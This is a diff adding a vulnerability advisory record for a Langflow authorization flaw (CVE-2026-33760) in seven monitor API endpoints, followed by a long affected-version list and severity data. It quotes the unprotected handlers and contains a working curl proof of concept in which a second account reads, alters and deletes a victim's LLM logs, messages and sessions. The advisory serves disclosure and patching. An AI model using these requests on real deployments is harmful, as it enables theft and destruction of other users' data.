@@ -1,0 +1,468 @@
+advisory_id: GHSA-9c59-2mvc-vfr8
+datasource_id: github_osv/GHSA-9c59-2mvc-vfr8
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-9c59-2mvc-vfr8/GHSA-9c59-2mvc-vfr8.json
+aliases:
+  - CVE-2026-33760
+summary: |
+  Langflow: IDOR/BOLA in Monitor API — Missing Ownership Enforcement on 7 Endpoints
+  ### Summary
+
+  Langflow's `/api/v1/monitor` router exposes 7 endpoints that perform read, write, and delete operations on user-owned resources — messages, sessions, build artifacts, and LLM transaction logs — without verifying that the authenticated requester owns the targeted resource. Any authenticated user can read, modify, rename, or permanently delete another user's data by supplying the target's resource ID or `flow_id`. This is a classic IDOR/BOLA vulnerability. Notably, the same source file (`monitor.py`) contains one correctly-implemented endpoint that uses an ownership check, demonstrating the correct pattern was known but inconsistently applied.
+
+
+  ### Details
+
+  **Source file: `src/backend/base/langflow/api/v1/monitor.py`**
+
+  The correct pattern (used only in `GET /monitor/messages`, lines 77–80):
+  ```python
+  stmt = select(MessageTable)
+  stmt = stmt.join(Flow, MessageTable.flow_id == Flow.id)
+  stmt = stmt.where(Flow.user_id == current_user.id)  # ownership enforced
+  ```
+
+  All 7 vulnerable endpoints are missing this guard:
+
+  **1. `GET /api/v1/monitor/builds` (lines 27–33)** — reads build data for any `flow_id`:
+  ```python
+  @router.get("/builds", dependencies=[Depends(get_current_active_user)])
+  async def get_vertex_builds(flow_id: Annotated[UUID, Query()], session: DbSession):
+      vertex_builds = await get_vertex_builds_by_flow_id(session, flow_id)  # no ownership check
+      return VertexBuildMapModel.from_list_of_dicts(vertex_builds)
+  ```
+
+  **2. `DELETE /api/v1/monitor/messages` (lines 102–107)** — deletes any message by UUID:
+  ```python
+  @router.delete("/messages", status_code=204, dependencies=[Depends(get_current_active_user)])
+  async def delete_messages(message_ids: list[UUID], session: DbSession):
+      await session.exec(delete(MessageTable).where(MessageTable.id.in_(message_ids)))
+      # message_ids accepted verbatim, no ownership check
+  ```
+
+  **3. `PUT /api/v1/monitor/messages/{message_id}` (lines 110–134)** — overwrites any message:
+  ```python
+  db_message = await session.get(MessageTable, message_id)
+  # no check: db_message.flow_id → Flow.user_id == current_user.id
+  db_message.sqlmodel_update(message_dict)
+  ```
+
+  **4. `PATCH /api/v1/monitor/messages/session/{old_session_id}` (lines 137–171)** — renames any session:
+  ```python
+  stmt = select(MessageTable).where(MessageTable.session_id == old_session_id)
+  # no JOIN to Flow, no WHERE Flow.user_id == current_user.id
+  ```
+
+  **5. `DELETE /api/v1/monitor/messages/session/{session_id}` (lines 174–188)** — bulk-deletes any session:
+  ```python
+  await session.exec(
+      delete(MessageTable).where(col(MessageTable.session_id) == session_id)
+      # no ownership filter
+  )
+  ```
+
+  **6. `GET /api/v1/monitor/transactions` (lines 191–211)** — reads LLM prompt/response logs for any `flow_id`:
+  ```python
+  stmt = select(TransactionTable).where(TransactionTable.flow_id == flow_id)
+  # no JOIN to Flow, no WHERE Flow.user_id == current_user.id
+  ```
+
+  **7. `DELETE /api/v1/monitor/builds`** — deletes build records for any `flow_id`:
+  Shares the same root cause as endpoint #1 (`GET /builds`): `flow_id` is accepted as a bare query parameter and passed to the deletion path without a `WHERE Flow.user_id == current_user.id` ownership check, so any authenticated user can destroy another user's build artifacts.
+
+  ### PoC
+
+  Tested on Langflow v1.7.3 (`langflowai/langflow:1.7.3`) with two accounts: `langflow` (victim) and `attacker_test` (attacker).
+
+  ```bash
+  # Setup: authenticate both users
+  TOKEN=$(curl -s -X POST http://localhost:7860/api/v1/login \
+    -d "username=langflow&password=langflow" \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+  ATTKR=$(curl -s -X POST http://localhost:7860/api/v1/login \
+    -d "username=attacker_test&password=Attacker123" \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
+
+  # Victim creates a flow (attacker only needs to know the flow_id — obtainable via brute force or enumeration)
+  FLOW_ID=$(curl -s -X POST http://localhost:7860/api/v1/flows/ \
+    -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -d '{"name":"victim-flow","data":{"nodes":[],"edges":[]}}' \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")
+
+  # PoC 1: Read victim's LLM transaction logs (prompts + model responses)
+  curl -s "http://localhost:7860/api/v1/monitor/transactions?flow_id=$FLOW_ID" \
+    -H "Authorization: Bearer $ATTKR"
+  # HTTP 200 — full transaction log returned including user prompts and model responses
+
+  # PoC 2: Read victim's build data
+  curl -s "http://localhost:7860/api/v1/monitor/builds?flow_id=$FLOW_ID" \
+    -H "Authorization: Bearer $ATTKR"
+  # HTTP 200
+
+  # PoC 3: Delete victim's message (MESSAGE_ID obtained from transaction log above)
+  curl -s -X DELETE "http://localhost:7860/api/v1/monitor/messages" \
+    -H "Authorization: Bearer $ATTKR" -H "Content-Type: application/json" \
+    -d '["<victim_message_id>"]'
+  # HTTP 204 — message deleted
+
+  # PoC 4: Tamper with victim's message content
+  curl -s -X PUT "http://localhost:7860/api/v1/monitor/messages/<victim_message_id>" \
+    -H "Authorization: Bearer $ATTKR" -H "Content-Type: application/json" \
+    -d '{"text":"TAMPERED BY ATTACKER"}'
+  # HTTP 200 — message overwritten, "edit":true set
+
+  # PoC 5: Rename victim's session
+  curl -s -X PATCH \
+    "http://localhost:7860/api/v1/monitor/messages/session/victim-session-1?new_session_id=attacker-controlled" \
+    -H "Authorization: Bearer $ATTKR"
+  # HTTP 200 — session renamed
+
+  # PoC 6: Bulk-delete victim's entire session
+  curl -s -X DELETE \
+    "http://localhost:7860/api/v1/monitor/messages/session/victim-session-2" \
+    -H "Authorization: Bearer $ATTKR"
+  # HTTP 204 — entire session deleted
+  ```
+
+  All 6 demonstrated attack vectors confirmed (the 7th, `DELETE /builds`, shares the `GET /builds` root cause and was not separately scripted). After attacker operations: victim's message text read `"TAMPERED BY ATTACKER"`, session renamed to attacker-controlled name, second session completely deleted.
+
+  ### Impact
+
+  This vulnerability affects any Langflow deployment with multiple users (team instances, SaaS deployments, enterprise self-hosted).
+
+  **Confidentiality:** `GET /transactions` exposes the full LLM conversation history — user-submitted prompts and model responses — for any flow by `flow_id`. In healthcare, legal, financial, or HR deployments this directly exposes sensitive and potentially regulated data (HIPAA, GDPR). `GET /builds` exposes internal workflow execution state.
+
+  **Integrity:** `PUT /messages/{id}` allows rewriting any stored message, corrupting chat history, audit trails, and RAG-indexed memory. `PATCH /messages/session/{id}` allows renaming sessions, breaking session continuity and potentially injecting victim context into attacker-controlled namespaces.
+
+  **Availability:** `DELETE /messages` and `DELETE /messages/session/{id}` enable permanent, irreversible destruction of another user's conversation history and LLM logs. No recovery mechanism exists once data is deleted.
+
+  Any registered user account (including self-registered accounts if registration is open) has unrestricted cross-user access to all 6 operations against any other user's data.
+impacted_packages:
+  - purl: pkg:pypi/langflow
+    affected_versions: vers:pypi/<1.9.0
+    fixed_versions: vers:pypi/1.9.0
+    affected_packages:
+      - pkg:pypi/langflow@0.0.31
+      - pkg:pypi/langflow@0.0.32
+      - pkg:pypi/langflow@0.0.33
+      - pkg:pypi/langflow@0.0.40
+      - pkg:pypi/langflow@0.0.44
+      - pkg:pypi/langflow@0.0.45
+      - pkg:pypi/langflow@0.0.46
+      - pkg:pypi/langflow@0.0.52
+      - pkg:pypi/langflow@0.0.53
+      - pkg:pypi/langflow@0.0.54
+      - pkg:pypi/langflow@0.0.55
+      - pkg:pypi/langflow@0.0.56
+      - pkg:pypi/langflow@0.0.57
+      - pkg:pypi/langflow@0.0.58
+      - pkg:pypi/langflow@0.0.61
+      - pkg:pypi/langflow@0.0.62
+      - pkg:pypi/langflow@0.0.63
+      - pkg:pypi/langflow@0.0.64
+      - pkg:pypi/langflow@0.0.65
+      - pkg:pypi/langflow@0.0.66
+      - pkg:pypi/langflow@0.0.67
+      - pkg:pypi/langflow@0.0.68
+      - pkg:pypi/langflow@0.0.69
+      - pkg:pypi/langflow@0.0.70
+      - pkg:pypi/langflow@0.0.71
+      - pkg:pypi/langflow@0.0.72
+      - pkg:pypi/langflow@0.0.73
+      - pkg:pypi/langflow@0.0.74
+      - pkg:pypi/langflow@0.0.75
+      - pkg:pypi/langflow@0.0.76
+      - pkg:pypi/langflow@0.0.78
+      - pkg:pypi/langflow@0.0.79
+      - pkg:pypi/langflow@0.0.80
+      - pkg:pypi/langflow@0.0.81
+      - pkg:pypi/langflow@0.0.83
+      - pkg:pypi/langflow@0.0.84
+      - pkg:pypi/langflow@0.0.85
+      - pkg:pypi/langflow@0.0.86
+      - pkg:pypi/langflow@0.0.87
+      - pkg:pypi/langflow@0.0.88
+      - pkg:pypi/langflow@0.0.89
+      - pkg:pypi/langflow@0.1.0
+      - pkg:pypi/langflow@0.1.2
+      - pkg:pypi/langflow@0.1.3
+      - pkg:pypi/langflow@0.1.4
+      - pkg:pypi/langflow@0.1.5
+      - pkg:pypi/langflow@0.1.6
+      - pkg:pypi/langflow@0.1.7
+      - pkg:pypi/langflow@0.2.0
+      - pkg:pypi/langflow@0.2.1
+      - pkg:pypi/langflow@0.2.2
+      - pkg:pypi/langflow@0.2.3
+      - pkg:pypi/langflow@0.2.4
+      - pkg:pypi/langflow@0.2.5
+      - pkg:pypi/langflow@0.2.6
+      - pkg:pypi/langflow@0.2.7
+      - pkg:pypi/langflow@0.2.8
+      - pkg:pypi/langflow@0.2.9
+      - pkg:pypi/langflow@0.2.10
+      - pkg:pypi/langflow@0.2.11
+      - pkg:pypi/langflow@0.2.12
+      - pkg:pypi/langflow@0.2.13
+      - pkg:pypi/langflow@0.3.0
+      - pkg:pypi/langflow@0.3.1
+      - pkg:pypi/langflow@0.3.2
+      - pkg:pypi/langflow@0.3.3
+      - pkg:pypi/langflow@0.3.4
+      - pkg:pypi/langflow@0.4.0
+      - pkg:pypi/langflow@0.4.1
+      - pkg:pypi/langflow@0.4.2
+      - pkg:pypi/langflow@0.4.3
+      - pkg:pypi/langflow@0.4.4
+      - pkg:pypi/langflow@0.4.5
+      - pkg:pypi/langflow@0.4.6
+      - pkg:pypi/langflow@0.4.7
+      - pkg:pypi/langflow@0.4.8
+      - pkg:pypi/langflow@0.4.9
+      - pkg:pypi/langflow@0.4.10
+      - pkg:pypi/langflow@0.4.11
+      - pkg:pypi/langflow@0.4.12
+      - pkg:pypi/langflow@0.4.14
+      - pkg:pypi/langflow@0.4.15
+      - pkg:pypi/langflow@0.4.16
+      - pkg:pypi/langflow@0.4.17
+      - pkg:pypi/langflow@0.4.18
+      - pkg:pypi/langflow@0.4.19
+      - pkg:pypi/langflow@0.4.20
+      - pkg:pypi/langflow@0.4.21
+      - pkg:pypi/langflow@0.5.0a0
+      - pkg:pypi/langflow@0.5.0a1
+      - pkg:pypi/langflow@0.5.0a2
+      - pkg:pypi/langflow@0.5.0a3
+      - pkg:pypi/langflow@0.5.0a4
+      - pkg:pypi/langflow@0.5.0a5
+      - pkg:pypi/langflow@0.5.0a6
+      - pkg:pypi/langflow@0.5.0b0
+      - pkg:pypi/langflow@0.5.0b2
+      - pkg:pypi/langflow@0.5.0b3
+      - pkg:pypi/langflow@0.5.0b4
+      - pkg:pypi/langflow@0.5.0b5
+      - pkg:pypi/langflow@0.5.0b6
+      - pkg:pypi/langflow@0.5.0
+      - pkg:pypi/langflow@0.5.1
+      - pkg:pypi/langflow@0.5.2
+      - pkg:pypi/langflow@0.5.3
+      - pkg:pypi/langflow@0.5.4
+      - pkg:pypi/langflow@0.5.5
+      - pkg:pypi/langflow@0.5.6
+      - pkg:pypi/langflow@0.5.7
+      - pkg:pypi/langflow@0.5.8
+      - pkg:pypi/langflow@0.5.9
+      - pkg:pypi/langflow@0.5.10
+      - pkg:pypi/langflow@0.5.11
+      - pkg:pypi/langflow@0.5.12
+      - pkg:pypi/langflow@0.6.0rc1
+      - pkg:pypi/langflow@0.6.0
+      - pkg:pypi/langflow@0.6.1
+      - pkg:pypi/langflow@0.6.2
+      - pkg:pypi/langflow@0.6.3a0
+      - pkg:pypi/langflow@0.6.3a1
+      - pkg:pypi/langflow@0.6.3a2
+      - pkg:pypi/langflow@0.6.3a3
+      - pkg:pypi/langflow@0.6.3a4
+      - pkg:pypi/langflow@0.6.3a5
+      - pkg:pypi/langflow@0.6.3a6
+      - pkg:pypi/langflow@0.6.3a7
+      - pkg:pypi/langflow@0.6.3
+      - pkg:pypi/langflow@0.6.4a0
+      - pkg:pypi/langflow@0.6.4a1
+      - pkg:pypi/langflow@0.6.4
+      - pkg:pypi/langflow@0.6.5a0
+      - pkg:pypi/langflow@0.6.5a1
+      - pkg:pypi/langflow@0.6.5a2
+      - pkg:pypi/langflow@0.6.5a3
+      - pkg:pypi/langflow@0.6.5a4
+      - pkg:pypi/langflow@0.6.5a5
+      - pkg:pypi/langflow@0.6.5a6
+      - pkg:pypi/langflow@0.6.5a7
+      - pkg:pypi/langflow@0.6.5a8
+      - pkg:pypi/langflow@0.6.5a9
+      - pkg:pypi/langflow@0.6.5a10
+      - pkg:pypi/langflow@0.6.5a11
+      - pkg:pypi/langflow@0.6.5a12
+      - pkg:pypi/langflow@0.6.5a13
+      - pkg:pypi/langflow@0.6.5
+      - pkg:pypi/langflow@0.6.6
+      - pkg:pypi/langflow@0.6.7a1
+      - pkg:pypi/langflow@0.6.7a2
+      - pkg:pypi/langflow@0.6.7a3
+      - pkg:pypi/langflow@0.6.7a5
+      - pkg:pypi/langflow@0.6.7
+      - pkg:pypi/langflow@0.6.8
+      - pkg:pypi/langflow@0.6.9
+      - pkg:pypi/langflow@0.6.10
+      - pkg:pypi/langflow@0.6.11
+      - pkg:pypi/langflow@0.6.12
+      - pkg:pypi/langflow@0.6.14
+      - pkg:pypi/langflow@0.6.15
+      - pkg:pypi/langflow@0.6.16
+      - pkg:pypi/langflow@0.6.17
+      - pkg:pypi/langflow@0.6.18
+      - pkg:pypi/langflow@0.6.19
+      - pkg:pypi/langflow@1.0.0a0
+      - pkg:pypi/langflow@1.0.0a1
+      - pkg:pypi/langflow@1.0.0a2
+      - pkg:pypi/langflow@1.0.0a3
+      - pkg:pypi/langflow@1.0.0a4
+      - pkg:pypi/langflow@1.0.0a5
+      - pkg:pypi/langflow@1.0.0a6
+      - pkg:pypi/langflow@1.0.0a7
+      - pkg:pypi/langflow@1.0.0a8
+      - pkg:pypi/langflow@1.0.0a9
+      - pkg:pypi/langflow@1.0.0a10
+      - pkg:pypi/langflow@1.0.0a11
+      - pkg:pypi/langflow@1.0.0a12
+      - pkg:pypi/langflow@1.0.0a13
+      - pkg:pypi/langflow@1.0.0a14
+      - pkg:pypi/langflow@1.0.0a15
+      - pkg:pypi/langflow@1.0.0a17
+      - pkg:pypi/langflow@1.0.0a18
+      - pkg:pypi/langflow@1.0.0a19
+      - pkg:pypi/langflow@1.0.0a20
+      - pkg:pypi/langflow@1.0.0a21
+      - pkg:pypi/langflow@1.0.0a22
+      - pkg:pypi/langflow@1.0.0a23
+      - pkg:pypi/langflow@1.0.0a24
+      - pkg:pypi/langflow@1.0.0a25
+      - pkg:pypi/langflow@1.0.0a26
+      - pkg:pypi/langflow@1.0.0a27
+      - pkg:pypi/langflow@1.0.0a28
+      - pkg:pypi/langflow@1.0.0a29
+      - pkg:pypi/langflow@1.0.0a30
+      - pkg:pypi/langflow@1.0.0a31
+      - pkg:pypi/langflow@1.0.0a32
+      - pkg:pypi/langflow@1.0.0a33
+      - pkg:pypi/langflow@1.0.0a34
+      - pkg:pypi/langflow@1.0.0a35
+      - pkg:pypi/langflow@1.0.0a36
+      - pkg:pypi/langflow@1.0.0a37
+      - pkg:pypi/langflow@1.0.0a38
+      - pkg:pypi/langflow@1.0.0a39
+      - pkg:pypi/langflow@1.0.0a40
+      - pkg:pypi/langflow@1.0.0a41
+      - pkg:pypi/langflow@1.0.0a42
+      - pkg:pypi/langflow@1.0.0a43
+      - pkg:pypi/langflow@1.0.0a44
+      - pkg:pypi/langflow@1.0.0a45
+      - pkg:pypi/langflow@1.0.0a46
+      - pkg:pypi/langflow@1.0.0a47
+      - pkg:pypi/langflow@1.0.0a48
+      - pkg:pypi/langflow@1.0.0a49
+      - pkg:pypi/langflow@1.0.0a50
+      - pkg:pypi/langflow@1.0.0a51
+      - pkg:pypi/langflow@1.0.0a52
+      - pkg:pypi/langflow@1.0.0a53
+      - pkg:pypi/langflow@1.0.0a55
+      - pkg:pypi/langflow@1.0.0a56
+      - pkg:pypi/langflow@1.0.0a57
+      - pkg:pypi/langflow@1.0.0a58
+      - pkg:pypi/langflow@1.0.0a59
+      - pkg:pypi/langflow@1.0.0a60
+      - pkg:pypi/langflow@1.0.0a61
+      - pkg:pypi/langflow@1.0.0rc0
+      - pkg:pypi/langflow@1.0.0rc1
+      - pkg:pypi/langflow@1.0.0
+      - pkg:pypi/langflow@1.0.1
+      - pkg:pypi/langflow@1.0.2
+      - pkg:pypi/langflow@1.0.3
+      - pkg:pypi/langflow@1.0.4
+      - pkg:pypi/langflow@1.0.5
+      - pkg:pypi/langflow@1.0.6
+      - pkg:pypi/langflow@1.0.7
+      - pkg:pypi/langflow@1.0.8
+      - pkg:pypi/langflow@1.0.9
+      - pkg:pypi/langflow@1.0.10
+      - pkg:pypi/langflow@1.0.11
+      - pkg:pypi/langflow@1.0.12
+      - pkg:pypi/langflow@1.0.13
+      - pkg:pypi/langflow@1.0.14
+      - pkg:pypi/langflow@1.0.15
+      - pkg:pypi/langflow@1.0.16
+      - pkg:pypi/langflow@1.0.17
+      - pkg:pypi/langflow@1.0.18
+      - pkg:pypi/langflow@1.0.19
+      - pkg:pypi/langflow@1.0.19.post1
+      - pkg:pypi/langflow@1.0.19.post2
+      - pkg:pypi/langflow@1.1.0
+      - pkg:pypi/langflow@1.1.1
+      - pkg:pypi/langflow@1.1.2
+      - pkg:pypi/langflow@1.1.3
+      - pkg:pypi/langflow@1.1.4
+      - pkg:pypi/langflow@1.1.4.post1
+      - pkg:pypi/langflow@1.2.0
+      - pkg:pypi/langflow@1.3.0
+      - pkg:pypi/langflow@1.3.1
+      - pkg:pypi/langflow@1.3.2
+      - pkg:pypi/langflow@1.3.3
+      - pkg:pypi/langflow@1.3.4
+      - pkg:pypi/langflow@1.4.0
+      - pkg:pypi/langflow@1.4.1
+      - pkg:pypi/langflow@1.4.2
+      - pkg:pypi/langflow@1.4.3
+      - pkg:pypi/langflow@1.5.0
+      - pkg:pypi/langflow@1.5.0.post1
+      - pkg:pypi/langflow@1.5.0.post2
+      - pkg:pypi/langflow@1.5.1
+      - pkg:pypi/langflow@1.6.0
+      - pkg:pypi/langflow@1.6.1
+      - pkg:pypi/langflow@1.6.2
+      - pkg:pypi/langflow@1.6.3
+      - pkg:pypi/langflow@1.6.4
+      - pkg:pypi/langflow@1.6.5
+      - pkg:pypi/langflow@1.6.6
+      - pkg:pypi/langflow@1.6.7
+      - pkg:pypi/langflow@1.6.8
+      - pkg:pypi/langflow@1.6.9
+      - pkg:pypi/langflow@1.7.0
+      - pkg:pypi/langflow@1.7.1
+      - pkg:pypi/langflow@1.7.2
+      - pkg:pypi/langflow@1.7.3
+      - pkg:pypi/langflow@1.8.0rc0
+      - pkg:pypi/langflow@1.8.0rc1
+      - pkg:pypi/langflow@1.8.0rc2
+      - pkg:pypi/langflow@1.8.0rc3
+      - pkg:pypi/langflow@1.8.0rc4
+      - pkg:pypi/langflow@1.8.0rc5
+      - pkg:pypi/langflow@1.8.0rc6
+      - pkg:pypi/langflow@1.8.0
+      - pkg:pypi/langflow@1.8.1
+      - pkg:pypi/langflow@1.8.2
+      - pkg:pypi/langflow@1.8.3rc0
+      - pkg:pypi/langflow@1.8.3
+      - pkg:pypi/langflow@1.8.4
+    fixed_packages:
+      - pkg:pypi/langflow@1.9.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-9c59-2mvc-vfr8/GHSA-9c59-2mvc-vfr8.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-639
+references:
+  - url: https://github.com/langflow-ai/langflow
+    reference_type:
+    reference_id:
+  - url: https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-242.yaml
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-33760
+    reference_type:
+    reference_id: CVE-2026-33760
+  - url: https://github.com/langflow-ai/langflow/security/advisories/GHSA-9c59-2mvc-vfr8
+    reference_type: other
+    reference_id: GHSA-9c59-2mvc-vfr8
+exploits: []
